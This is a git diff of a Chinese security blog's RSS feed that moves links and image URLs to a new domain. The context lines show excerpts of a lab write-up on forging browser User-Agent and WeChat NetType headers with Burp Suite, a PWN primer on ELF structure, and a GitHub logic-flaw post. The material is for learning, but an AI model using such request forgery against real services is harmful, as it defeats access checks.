-        <description>&lt;img src="https://blog.nanosec.site/p/web%E5%AE%89%E5%85%A8--%E6%B5%8F%E8%A7%88%E5%99%A8%E4%BF%A1%E6%81%AF%E4%BC%AA%E9%80%A0/cover.jpg" alt="Featured image of post Web安全--浏览器信息伪造" /&gt;&lt;h1 id=&#34;web安全----浏览器信息伪造&#34;&gt;Web安全&amp;mdash;-浏览器信息伪造&lt;/h1&gt;
+        <guid>https://kira-pgr.github.io/p/web%E5%AE%89%E5%85%A8--%E6%B5%8F%E8%A7%88%E5%99%A8%E4%BF%A1%E6%81%AF%E4%BC%AA%E9%80%A0/</guid>
+        <description>&lt;img src="https://kira-pgr.github.io/p/web%E5%AE%89%E5%85%A8--%E6%B5%8F%E8%A7%88%E5%99%A8%E4%BF%A1%E6%81%AF%E4%BC%AA%E9%80%A0/cover.jpg" alt="Featured image of post Web安全--浏览器信息伪造" /&gt;&lt;h1 id=&#34;web安全----浏览器信息伪造&#34;&gt;Web安全&amp;mdash;-浏览器信息伪造&lt;/h1&gt;
 &lt;p&gt;&amp;ldquo;诶。。。PGR酱你用的什么浏览器&amp;rdquo;&lt;/p&gt;
 &lt;p&gt;— &lt;strong&gt;MimiKs-Sec-Browser.QwQ.&lt;/strong&gt;&lt;/p&gt;
 &lt;p&gt;&amp;ldquo;啊= =哪有这种浏览器&amp;rdquo;&lt;/p&gt;
 &lt;p&gt;— 诶嘿嘿，我就有这样神奇的浏览器XD&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://blog.nanosec.site/p/web%E5%AE%89%E5%85%A8--%E6%B5%8F%E8%A7%88%E5%99%A8%E4%BF%A1%E6%81%AF%E4%BC%AA%E9%80%A0/b.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://kira-pgr.github.io/p/web%E5%AE%89%E5%85%A8--%E6%B5%8F%E8%A7%88%E5%99%A8%E4%BF%A1%E6%81%AF%E4%BC%AA%E9%80%A0/b.png&#34;
 	width=&#34;355&#34;
 	height=&#34;161&#34;
-	srcset=&#34;https://blog.nanosec.site/p/web%E5%AE%89%E5%85%A8--%E6%B5%8F%E8%A7%88%E5%99%A8%E4%BF%A1%E6%81%AF%E4%BC%AA%E9%80%A0/b_hu3234880e455363fbc08a61a3a9ec58d7_7962_480x0_resize_box_3.png 480w, https://blog.nanosec.site/p/web%E5%AE%89%E5%85%A8--%E6%B5%8F%E8%A7%88%E5%99%A8%E4%BF%A1%E6%81%AF%E4%BC%AA%E9%80%A0/b_hu3234880e455363fbc08a61a3a9ec58d7_7962_1024x0_resize_box_3.png 1024w&#34;
+	srcset=&#34;https://kira-pgr.github.io/p/web%E5%AE%89%E5%85%A8--%E6%B5%8F%E8%A7%88%E5%99%A8%E4%BF%A1%E6%81%AF%E4%BC%AA%E9%80%A0/b_hu3234880e455363fbc08a61a3a9ec58d7_7962_480x0_resize_box_3.png 480w, https://kira-pgr.github.io/p/web%E5%AE%89%E5%85%A8--%E6%B5%8F%E8%A7%88%E5%99%A8%E4%BF%A1%E6%81%AF%E4%BC%AA%E9%80%A0/b_hu3234880e455363fbc08a61a3a9ec58d7_7962_1024x0_resize_box_3.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;诶嘿嘿，有图片作证哦qaq&#34;
@@ -3571,10 +3571,10 @@
 &lt;ul&gt;
 &lt;li&gt;抓包工具推荐&lt;strong&gt;Burp Suite&lt;/strong&gt;&lt;/li&gt;
 &lt;/ul&gt;
-&lt;p&gt;&lt;img src=&#34;https://blog.nanosec.site/p/web%E5%AE%89%E5%85%A8--%E6%B5%8F%E8%A7%88%E5%99%A8%E4%BF%A1%E6%81%AF%E4%BC%AA%E9%80%A0/burp.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://kira-pgr.github.io/p/web%E5%AE%89%E5%85%A8--%E6%B5%8F%E8%A7%88%E5%99%A8%E4%BF%A1%E6%81%AF%E4%BC%AA%E9%80%A0/burp.png&#34;
 	width=&#34;1668&#34;
 	height=&#34;799&#34;
-	srcset=&#34;https://blog.nanosec.site/p/web%E5%AE%89%E5%85%A8--%E6%B5%8F%E8%A7%88%E5%99%A8%E4%BF%A1%E6%81%AF%E4%BC%AA%E9%80%A0/burp_hu8a74becd61013693fc66c7c5802277f5_197339_480x0_resize_box_3.png 480w, https://blog.nanosec.site/p/web%E5%AE%89%E5%85%A8--%E6%B5%8F%E8%A7%88%E5%99%A8%E4%BF%A1%E6%81%AF%E4%BC%AA%E9%80%A0/burp_hu8a74becd61013693fc66c7c5802277f5_197339_1024x0_resize_box_3.png 1024w&#34;
+	srcset=&#34;https://kira-pgr.github.io/p/web%E5%AE%89%E5%85%A8--%E6%B5%8F%E8%A7%88%E5%99%A8%E4%BF%A1%E6%81%AF%E4%BC%AA%E9%80%A0/burp_hu8a74becd61013693fc66c7c5802277f5_197339_480x0_resize_box_3.png 480w, https://kira-pgr.github.io/p/web%E5%AE%89%E5%85%A8--%E6%B5%8F%E8%A7%88%E5%99%A8%E4%BF%A1%E6%81%AF%E4%BC%AA%E9%80%A0/burp_hu8a74becd61013693fc66c7c5802277f5_197339_1024x0_resize_box_3.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;Burp Suite&#34;
@@ -3631,10 +3631,10 @@
     &gt;浏览器信息伪造_网络安全_在线靶场_墨者学院_专注于网络安全人才培养&lt;/a&gt;&lt;/p&gt;
 &lt;/blockquote&gt;
 &lt;p&gt;首先分析一下这个网站&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://blog.nanosec.site/p/web%E5%AE%89%E5%85%A8--%E6%B5%8F%E8%A7%88%E5%99%A8%E4%BF%A1%E6%81%AF%E4%BC%AA%E9%80%A0/site.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://kira-pgr.github.io/p/web%E5%AE%89%E5%85%A8--%E6%B5%8F%E8%A7%88%E5%99%A8%E4%BF%A1%E6%81%AF%E4%BC%AA%E9%80%A0/site.png&#34;
 	width=&#34;1914&#34;
 	height=&#34;729&#34;
-	srcset=&#34;https://blog.nanosec.site/p/web%E5%AE%89%E5%85%A8--%E6%B5%8F%E8%A7%88%E5%99%A8%E4%BF%A1%E6%81%AF%E4%BC%AA%E9%80%A0/site_hu05da5692f86aaaf2e46f0baa09415d63_219739_480x0_resize_box_3.png 480w, https://blog.nanosec.site/p/web%E5%AE%89%E5%85%A8--%E6%B5%8F%E8%A7%88%E5%99%A8%E4%BF%A1%E6%81%AF%E4%BC%AA%E9%80%A0/site_hu05da5692f86aaaf2e46f0baa09415d63_219739_1024x0_resize_box_3.png 1024w&#34;
+	srcset=&#34;https://kira-pgr.github.io/p/web%E5%AE%89%E5%85%A8--%E6%B5%8F%E8%A7%88%E5%99%A8%E4%BF%A1%E6%81%AF%E4%BC%AA%E9%80%A0/site_hu05da5692f86aaaf2e46f0baa09415d63_219739_480x0_resize_box_3.png 480w, https://kira-pgr.github.io/p/web%E5%AE%89%E5%85%A8--%E6%B5%8F%E8%A7%88%E5%99%A8%E4%BF%A1%E6%81%AF%E4%BC%AA%E9%80%A0/site_hu05da5692f86aaaf2e46f0baa09415d63_219739_1024x0_resize_box_3.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;网站&#34;
@@ -3652,10 +3652,10 @@
 &lt;blockquote&gt;
 &lt;p&gt;注意:根据页面提示,抓包分析除了判断浏览器类型还判断了微信特有的NetType&lt;/p&gt;
 &lt;/blockquote&gt;
-&lt;p&gt;&lt;img src=&#34;https://blog.nanosec.site/p/web%E5%AE%89%E5%85%A8--%E6%B5%8F%E8%A7%88%E5%99%A8%E4%BF%A1%E6%81%AF%E4%BC%AA%E9%80%A0/img.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://kira-pgr.github.io/p/web%E5%AE%89%E5%85%A8--%E6%B5%8F%E8%A7%88%E5%99%A8%E4%BF%A1%E6%81%AF%E4%BC%AA%E9%80%A0/img.png&#34;
 	width=&#34;1435&#34;
 	height=&#34;644&#34;
-	srcset=&#34;https://blog.nanosec.site/p/web%E5%AE%89%E5%85%A8--%E6%B5%8F%E8%A7%88%E5%99%A8%E4%BF%A1%E6%81%AF%E4%BC%AA%E9%80%A0/img_hu2f279f03c9089f87b9cc1f801e632b5e_147828_480x0_resize_box_3.png 480w, https://blog.nanosec.site/p/web%E5%AE%89%E5%85%A8--%E6%B5%8F%E8%A7%88%E5%99%A8%E4%BF%A1%E6%81%AF%E4%BC%AA%E9%80%A0/img_hu2f279f03c9089f87b9cc1f801e632b5e_147828_1024x0_resize_box_3.png 1024w&#34;
+	srcset=&#34;https://kira-pgr.github.io/p/web%E5%AE%89%E5%85%A8--%E6%B5%8F%E8%A7%88%E5%99%A8%E4%BF%A1%E6%81%AF%E4%BC%AA%E9%80%A0/img_hu2f279f03c9089f87b9cc1f801e632b5e_147828_480x0_resize_box_3.png 480w, https://kira-pgr.github.io/p/web%E5%AE%89%E5%85%A8--%E6%B5%8F%E8%A7%88%E5%99%A8%E4%BF%A1%E6%81%AF%E4%BC%AA%E9%80%A0/img_hu2f279f03c9089f87b9cc1f801e632b5e_147828_1024x0_resize_box_3.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;抓到的数据包&#34;
@@ -3679,11 +3679,11 @@
         </item>
         <item>
         <title>PWN! PWN! PANG! Part1---基础知识</title>
-        <link>https://blog.nanosec.site/p/pwn-pwn-pang-part1---%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/</link>
+        <link>https://kira-pgr.github.io/p/pwn-pwn-pang-part1---%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/</link>
         <pubDate>Thu, 27 Jan 2022 21:24:46 -0500</pubDate>
         
-        <guid>https://blog.nanosec.site/p/pwn-pwn-pang-part1---%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/</guid>
-        <description>&lt;img src="https://blog.nanosec.site/p/pwn-pwn-pang-part1---%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/cover.jpg" alt="Featured image of post PWN! PWN! PANG! Part1---基础知识" /&gt;&lt;h1 id=&#34;pwn-pwn-pang-part1&#34;&gt;PWN! PWN! PANG! Part1&lt;/h1&gt;
+        <guid>https://kira-pgr.github.io/p/pwn-pwn-pang-part1---%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/</guid>
+        <description>&lt;img src="https://kira-pgr.github.io/p/pwn-pwn-pang-part1---%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/cover.jpg" alt="Featured image of post PWN! PWN! PANG! Part1---基础知识" /&gt;&lt;h1 id=&#34;pwn-pwn-pang-part1&#34;&gt;PWN! PWN! PANG! Part1&lt;/h1&gt;
 &lt;h2 id=&#34;前言&#34;&gt;前言&lt;/h2&gt;
 &lt;p&gt;这里是PGR的PWN基础学习笔记qaq，主要研究的是Linux下ELF可执行文件的漏洞利用&lt;/p&gt;
 &lt;p&gt;涉及内容:&lt;/p&gt;
@@ -3725,10 +3725,10 @@
 &lt;p&gt;控制（设备、服务器）&lt;/p&gt;
 &lt;/li&gt;
 &lt;/ul&gt;
-&lt;p&gt;&lt;img src=&#34;https://blog.nanosec.site/p/pwn-pwn-pang-part1---%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/pwn.jpg&#34;
+&lt;p&gt;&lt;img src=&#34;https://kira-pgr.github.io/p/pwn-pwn-pang-part1---%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/pwn.jpg&#34;
 	width=&#34;316&#34;
 	height=&#34;206&#34;
-	srcset=&#34;https://blog.nanosec.site/p/pwn-pwn-pang-part1---%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/pwn_hu128b26d5dee886e0836026592cbb57e4_14642_480x0_resize_q75_box.jpg 480w, https://blog.nanosec.site/p/pwn-pwn-pang-part1---%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/pwn_hu128b26d5dee886e0836026592cbb57e4_14642_1024x0_resize_q75_box.jpg 1024w&#34;
+	srcset=&#34;https://kira-pgr.github.io/p/pwn-pwn-pang-part1---%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/pwn_hu128b26d5dee886e0836026592cbb57e4_14642_480x0_resize_q75_box.jpg 480w, https://kira-pgr.github.io/p/pwn-pwn-pang-part1---%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/pwn_hu128b26d5dee886e0836026592cbb57e4_14642_1024x0_resize_q75_box.jpg 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;配个图&#34;
@@ -3742,10 +3742,10 @@
 &lt;h2 id=&#34;linux下elf文件&#34;&gt;Linux下ELF文件&lt;/h2&gt;
 &lt;p&gt;ELF文件的是Linux下的可执行文件，与Windows下exe文件不同&lt;/p&gt;
 &lt;p&gt;可以用File命令查看你的文件格式:&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://blog.nanosec.site/p/pwn-pwn-pang-part1---%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/file.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://kira-pgr.github.io/p/pwn-pwn-pang-part1---%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/file.png&#34;
 	width=&#34;1139&#34;
 	height=&#34;654&#34;
-	srcset=&#34;https://blog.nanosec.site/p/pwn-pwn-pang-part1---%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/file_hu1761c43f1feaec7dd67d54f7494ee724_547395_480x0_resize_box_3.png 480w, https://blog.nanosec.site/p/pwn-pwn-pang-part1---%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/file_hu1761c43f1feaec7dd67d54f7494ee724_547395_1024x0_resize_box_3.png 1024w&#34;
+	srcset=&#34;https://kira-pgr.github.io/p/pwn-pwn-pang-part1---%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/file_hu1761c43f1feaec7dd67d54f7494ee724_547395_480x0_resize_box_3.png 480w, https://kira-pgr.github.io/p/pwn-pwn-pang-part1---%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/file_hu1761c43f1feaec7dd67d54f7494ee724_547395_1024x0_resize_box_3.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;File命令&#34;
@@ -3761,10 +3761,10 @@
 &lt;p&gt;不过在文件夹窗口里双击这个.zip, 就会发现:这个ELF文件已经被当成压缩包打开   (这和win似乎很像)&lt;/p&gt;
 &lt;p&gt;可见在修改后缀名的过程中，干扰了系统对于文件打开方式的识别= =&lt;/p&gt;
 &lt;/blockquote&gt;
-&lt;p&gt;&lt;img src=&#34;https://blog.nanosec.site/p/pwn-pwn-pang-part1---%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/file1.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://kira-pgr.github.io/p/pwn-pwn-pang-part1---%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/file1.png&#34;
 	width=&#34;945&#34;
 	height=&#34;627&#34;
-	srcset=&#34;https://blog.nanosec.site/p/pwn-pwn-pang-part1---%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/file1_hu875359da3f79d0c44f12bd1a55586189_97232_480x0_resize_box_3.png 480w, https://blog.nanosec.site/p/pwn-pwn-pang-part1---%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/file1_hu875359da3f79d0c44f12bd1a55586189_97232_1024x0_resize_box_3.png 1024w&#34;
+	srcset=&#34;https://kira-pgr.github.io/p/pwn-pwn-pang-part1---%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/file1_hu875359da3f79d0c44f12bd1a55586189_97232_480x0_resize_box_3.png 480w, https://kira-pgr.github.io/p/pwn-pwn-pang-part1---%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/file1_hu875359da3f79d0c44f12bd1a55586189_97232_1024x0_resize_box_3.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;嘿嘿= =, 被迷惑了呢;)&#34;
@@ -3777,10 +3777,10 @@
 &gt;&lt;/p&gt;
 &lt;h2 id=&#34;elf文件的结构&#34;&gt;ELF文件的结构&lt;/h2&gt;
 &lt;p&gt;咳咳，貌似扯远了=   =&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://blog.nanosec.site/p/pwn-pwn-pang-part1---%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/ELF.jpg&#34;
+&lt;p&gt;&lt;img src=&#34;https://kira-pgr.github.io/p/pwn-pwn-pang-part1---%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/ELF.jpg&#34;
 	width=&#34;1363&#34;
 	height=&#34;716&#34;
-	srcset=&#34;https://blog.nanosec.site/p/pwn-pwn-pang-part1---%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/ELF_hu0ce4d14d1fe8e283ae7ea71aea35f162_138178_480x0_resize_q75_box.jpg 480w, https://blog.nanosec.site/p/pwn-pwn-pang-part1---%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/ELF_hu0ce4d14d1fe8e283ae7ea71aea35f162_138178_1024x0_resize_q75_box.jpg 1024w&#34;
+	srcset=&#34;https://kira-pgr.github.io/p/pwn-pwn-pang-part1---%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/ELF_hu0ce4d14d1fe8e283ae7ea71aea35f162_138178_480x0_resize_q75_box.jpg 480w, https://kira-pgr.github.io/p/pwn-pwn-pang-part1---%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/ELF_hu0ce4d14d1fe8e283ae7ea71aea35f162_138178_1024x0_resize_q75_box.jpg 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;ELF文件结构&#34;
@@ -3813,10 +3813,10 @@
 &lt;/ul&gt;
 &lt;p&gt;这些文件实际上代表着这个ELF文件在磁盘里的 一个个 &lt;strong&gt;&amp;ldquo;节&amp;rdquo;(Section)&lt;/strong&gt;&lt;/p&gt;
 &lt;p&gt;而当ELF被映射进内存中的时候， 就有了&lt;strong&gt;段(Segment)&lt;/strong&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://blog.nanosec.site/p/pwn-pwn-pang-part1---%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/ELF1.jpg&#34;
+&lt;p&gt;&lt;img src=&#34;https://kira-pgr.github.io/p/pwn-pwn-pang-part1---%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/ELF1.jpg&#34;
 	width=&#34;1351&#34;
 	height=&#34;703&#34;
-	srcset=&#34;https://blog.nanosec.site/p/pwn-pwn-pang-part1---%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/ELF1_hu72f2ee80ba7d32b6199946b7d38aa6e6_72517_480x0_resize_q75_box.jpg 480w, https://blog.nanosec.site/p/pwn-pwn-pang-part1---%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/ELF1_hu72f2ee80ba7d32b6199946b7d38aa6e6_72517_1024x0_resize_q75_box.jpg 1024w&#34;
+	srcset=&#34;https://kira-pgr.github.io/p/pwn-pwn-pang-part1---%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/ELF1_hu72f2ee80ba7d32b6199946b7d38aa6e6_72517_480x0_resize_q75_box.jpg 480w, https://kira-pgr.github.io/p/pwn-pwn-pang-part1---%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/ELF1_hu72f2ee80ba7d32b6199946b7d38aa6e6_72517_1024x0_resize_q75_box.jpg 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;节与段&#34;
@@ -3832,10 +3832,10 @@
 &lt;p&gt;(嘛 =    =， 因为我个人学的时候感觉这块知识对于后面影响挺大的)&lt;/p&gt;
 &lt;p&gt;先扯一下: 段是比节大的qaq&lt;/p&gt;
 &lt;p&gt;这里来一个非常非常经典且重要的图,有请:&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://blog.nanosec.site/p/pwn-pwn-pang-part1---%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/img.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://kira-pgr.github.io/p/pwn-pwn-pang-part1---%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/img.png&#34;
 	width=&#34;1359&#34;
 	height=&#34;717&#34;
-	srcset=&#34;https://blog.nanosec.site/p/pwn-pwn-pang-part1---%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/img_hu25854d26341c86fdce4489a656418346_70073_480x0_resize_box_3.png 480w, https://blog.nanosec.site/p/pwn-pwn-pang-part1---%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/img_hu25854d26341c86fdce4489a656418346_70073_1024x0_resize_box_3.png 1024w&#34;
+	srcset=&#34;https://kira-pgr.github.io/p/pwn-pwn-pang-part1---%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/img_hu25854d26341c86fdce4489a656418346_70073_480x0_resize_box_3.png 480w, https://kira-pgr.github.io/p/pwn-pwn-pang-part1---%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/img_hu25854d26341c86fdce4489a656418346_70073_1024x0_resize_box_3.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;非常非常经典且重要的图 PS: 还是QQ截图清楚  别打了别打了）&#34;
@@ -3858,10 +3858,10 @@
 &lt;/li&gt;
 &lt;li&gt;
 &lt;p&gt;最后, &amp;gt;__&amp;lt;, 再来个图;)&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://blog.nanosec.site/p/pwn-pwn-pang-part1---%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/img1.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://kira-pgr.github.io/p/pwn-pwn-pang-part1---%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/img1.png&#34;
 	width=&#34;1350&#34;
 	height=&#34;719&#34;
-	srcset=&#34;https://blog.nanosec.site/p/pwn-pwn-pang-part1---%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/img1_huc654210b42dc0202bb596523623c9d4c_100907_480x0_resize_box_3.png 480w, https://blog.nanosec.site/p/pwn-pwn-pang-part1---%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/img1_huc654210b42dc0202bb596523623c9d4c_100907_1024x0_resize_box_3.png 1024w&#34;
+	srcset=&#34;https://kira-pgr.github.io/p/pwn-pwn-pang-part1---%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/img1_huc654210b42dc0202bb596523623c9d4c_100907_480x0_resize_box_3.png 480w, https://kira-pgr.github.io/p/pwn-pwn-pang-part1---%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/img1_huc654210b42dc0202bb596523623c9d4c_100907_1024x0_resize_box_3.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;有关部分节的作用&#34;
@@ -3876,10 +3876,10 @@
 &lt;/ul&gt;
 &lt;h2 id=&#34;程序数据在内存中的组织&#34;&gt;程序数据在内存中的组织&lt;/h2&gt;
 &lt;p&gt;废话不说，直接上图()&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://blog.nanosec.site/p/pwn-pwn-pang-part1---%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/mem.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://kira-pgr.github.io/p/pwn-pwn-pang-part1---%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/mem.png&#34;
 	width=&#34;1355&#34;
 	height=&#34;711&#34;
-	srcset=&#34;https://blog.nanosec.site/p/pwn-pwn-pang-part1---%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/mem_huae9965f5cba59206b56105b8aa15edc0_63508_480x0_resize_box_3.png 480w, https://blog.nanosec.site/p/pwn-pwn-pang-part1---%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/mem_huae9965f5cba59206b56105b8aa15edc0_63508_1024x0_resize_box_3.png 1024w&#34;
+	srcset=&#34;https://kira-pgr.github.io/p/pwn-pwn-pang-part1---%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/mem_huae9965f5cba59206b56105b8aa15edc0_63508_480x0_resize_box_3.png 480w, https://kira-pgr.github.io/p/pwn-pwn-pang-part1---%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/mem_huae9965f5cba59206b56105b8aa15edc0_63508_1024x0_resize_box_3.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;程序数据在内存中的组织&#34;
@@ -3917,10 +3917,10 @@
 &lt;p&gt;既然都写了这么长了嘛=   =&lt;/p&gt;
 &lt;p&gt;那就继续下去好了。。咳咳。&lt;/p&gt;
 &lt;p&gt;&lt;em&gt;&lt;strong&gt;一些常用汇编指令&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://blog.nanosec.site/p/pwn-pwn-pang-part1---%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/asm.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://kira-pgr.github.io/p/pwn-pwn-pang-part1---%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/asm.png&#34;
 	width=&#34;1354&#34;
 	height=&#34;711&#34;
-	srcset=&#34;https://blog.nanosec.site/p/pwn-pwn-pang-part1---%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/asm_hudd3b919f86ee6bd3673bb8c9e0238d19_36486_480x0_resize_box_3.png 480w, https://blog.nanosec.site/p/pwn-pwn-pang-part1---%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/asm_hudd3b919f86ee6bd3673bb8c9e0238d19_36486_1024x0_resize_box_3.png 1024w&#34;
+	srcset=&#34;https://kira-pgr.github.io/p/pwn-pwn-pang-part1---%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/asm_hudd3b919f86ee6bd3673bb8c9e0238d19_36486_480x0_resize_box_3.png 480w, https://kira-pgr.github.io/p/pwn-pwn-pang-part1---%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/asm_hudd3b919f86ee6bd3673bb8c9e0238d19_36486_1024x0_resize_box_3.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;常用汇编指令&#34;
@@ -3949,11 +3949,11 @@
         </item>
         <item>
         <title>GitHub逻辑漏洞:Linus大神&#39;怒删&#39;Linux</title>
-        <link>https://blog.nanosec.site/p/github%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9Elinus%E5%A4%A7%E7%A5%9E%E6%80%92%E5%88%A0linux/</link>
+        <link>https://kira-pgr.github.io/p/github%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9Elinus%E5%A4%A7%E7%A5%9E%E6%80%92%E5%88%A0linux/</link>
         <pubDate>Wed, 26 Jan 2022 21:15:07 -0500</pubDate>
         
-        <guid>https://blog.nanosec.site/p/github%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9Elinus%E5%A4%A7%E7%A5%9E%E6%80%92%E5%88%A0linux/</guid>
-        <description>&lt;img src="https://blog.nanosec.site/p/github%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9Elinus%E5%A4%A7%E7%A5%9E%E6%80%92%E5%88%A0linux/cover.jpg" alt="Featured image of post GitHub逻辑漏洞:Linus大神&#39;怒删&#39;Linux" /&gt;&lt;h1 id=&#34;github-url修改逻辑漏洞&#34;&gt;GitHub url修改逻辑漏洞&lt;/h1&gt;
+        <guid>https://kira-pgr.github.io/p/github%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9Elinus%E5%A4%A7%E7%A5%9E%E6%80%92%E5%88%A0linux/</guid>
+        <description>&lt;img src="https://kira-pgr.github.io/p/github%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9Elinus%E5%A4%A7%E7%A5%9E%E6%80%92%E5%88%A0linux/cover.jpg" alt="Featured image of post GitHub逻辑漏洞:Linus大神&#39;怒删&#39;Linux" /&gt;&lt;h1 id=&#34;github-url修改逻辑漏洞&#34;&gt;GitHub url修改逻辑漏洞&lt;/h1&gt;
 &lt;h2 id=&#34;前言&#34;&gt;前言：&lt;/h2&gt;
 &lt;p&gt;大家好，我是鸽子PGR, 这是我第一篇博客= =&lt;/p&gt;
 &lt;p&gt;同时呢，这也意味着我接下来会&lt;strong&gt;放弃b站更新视频&lt;/strong&gt;，主要是想要多花一些时间提升一下自己的技术，并通过写博客的形式做笔记，毕竟做视频真的很麻烦qaq&lt;/p&gt;
@@ -3962,10 +3962,10 @@
 &lt;p&gt;咳咳，言归正传 OwO&lt;/p&gt;
 &lt;p&gt;最近刷GitHub的时候看到了&lt;a class=&#34;link&#34; href=&#34;https://github.com/torvalds/linux/tree/8bcab0346d4fcf21b97046eb44db8cf37ddd6da0&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
     &gt;这个&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://blog.nanosec.site/p/github%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9Elinus%E5%A4%A7%E7%A5%9E%E6%80%92%E5%88%A0linux/Att1.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://kira-pgr.github.io/p/github%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9Elinus%E5%A4%A7%E7%A5%9E%E6%80%92%E5%88%A0linux/Att1.png&#34;
 	width=&#34;1677&#34;
 	height=&#34;681&#34;
